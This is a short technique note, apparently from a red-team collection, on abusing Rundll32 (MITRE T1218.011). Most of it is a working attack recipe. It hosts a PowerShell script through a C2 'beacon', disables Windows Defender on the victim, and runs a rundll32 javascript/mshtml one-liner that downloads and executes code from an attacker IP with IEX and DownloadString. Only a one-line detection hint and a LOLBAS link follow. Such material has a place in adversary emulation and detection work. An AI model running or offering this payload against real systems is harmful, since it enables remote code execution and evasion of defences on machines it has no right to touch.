# [Rundll32](https://attack.mitre.org/techniques/T1218/011/)

## Exploit syntax:

1. Create a powershell script and save it to /tmp/christBeaver.txt

2. In posh run:
    ```
    add-hosted-file
    
    /tmp/christBeaver.txt

    /text

    text/html
    
    N
    ```

3. Ensure Windows Defender Live Protection is turned off on the victim machine

4. On your beacon, add the malicious IP and run:
    ```
    sharpps rundll32.exe 'javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://<IP address>/text'');")'
    ```

## Detection Technique:
* Investigate uses of rundll32 to start non typical processes such as cmd/powershell or to access non typical dlls.

---

## Resource
* https://lolbas-project.github.io/lolbas/Binaries/Rundll32/1`